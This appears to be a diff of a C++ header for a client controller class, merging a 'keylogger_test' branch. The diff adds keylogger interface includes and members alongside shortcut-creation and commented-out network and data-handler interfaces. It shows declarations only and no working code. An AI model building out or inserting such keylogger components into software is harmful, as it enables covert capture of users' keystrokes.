@@ -3,6 +3,7 @@
 
 # include "DLibrary.h"
 # include "IInfoClient.h"
+# include "IKeylogger.h"
 # include "WorkQueue.h"
 # include <Shlobj.h>
 # include <queue>
@@ -13,6 +14,9 @@
 #include "objbase.h"
 #include "objidl.h"
 #include "shlguid.h"
+#include <functional>
+#include <iostream>
+
 #pragma comment(lib, "shlwapi.lib")
 
 
@@ -25,12 +29,9 @@ class	clientController {
 
 	// Dictionaries
 	Dictionary	sayHello;
-<<<<<<< HEAD
 	Dictionary	infoClient;
-=======
 	Dictionary	keylogger_dll;
 
->>>>>>> keylogger_test
 public:
 
 	clientController(void) throw(DLibraryException);	// Initialise
@@ -38,19 +39,15 @@ public:
 
 	int			mainAction(int, char**);
 	void		sayHelloAction(void);
-<<<<<<< HEAD
 	void		defineShortcut(void);
 	bool		createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr);
+
 private:
 	_I_InfoClient *ifinstance;
-	/*IDataHandler *dhinstance;
+	/*IDataHandler *dhinstance; */
 	IKeylogger *klinstance;
-	INetwork *netinstance; */
+	/* INetwork *netinstance; */
 	WorkQueue _lwqueue;
-=======
-	void		initKeyloggerAction(void);
-
->>>>>>> keylogger_test
 };
 
 #endif /* !CLIENT_H__ */
